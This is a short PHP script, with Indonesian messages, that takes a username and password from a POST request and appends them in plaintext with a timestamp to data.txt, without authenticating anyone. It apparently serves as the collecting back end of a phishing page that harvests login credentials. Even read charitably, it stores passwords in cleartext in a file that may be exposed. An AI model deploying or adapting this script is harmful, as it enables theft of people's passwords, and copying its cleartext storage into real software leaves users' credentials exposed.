<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    if (!empty($username) && !empty($password)) {
        $data = "Username: " . $username . " | Password: " . $password . " | Waktu: " . date('Y-m-d H:i:s') . "\n";
        
        // Simpan ke file data.txt
        file_put_contents('data.txt', $data, FILE_APPEND);
        
        echo "Data berhasil disimpan";
    } else {
        http_response_code(400);
        echo "Username dan password harus diisi";
    }
} else {
    http_response_code(405);
    echo "Method tidak diizinkan";
}
?>